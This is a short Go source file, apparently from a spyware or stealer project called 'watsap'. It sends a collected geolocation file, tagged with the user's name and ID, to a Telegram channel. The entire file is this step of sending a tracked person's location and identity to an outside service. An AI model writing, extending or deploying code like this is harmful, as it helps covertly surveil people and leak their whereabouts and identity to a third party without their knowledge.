package geoip

import (
	"fmt"
	"watsap/utils/config"
	"watsap/utils/telegram"
)

// short user info
func GetUserInfoMsg() string {
	return fmt.Sprintf(`<b>User:</b> <code>%s</code>
<b>ID:</b> <code>%s</code>`, config.UserName, *config.UserID)
}

func SendGeoToTG() {
	telegram.TgSendFile(config.GeoFile, GetUserInfoMsg())
}
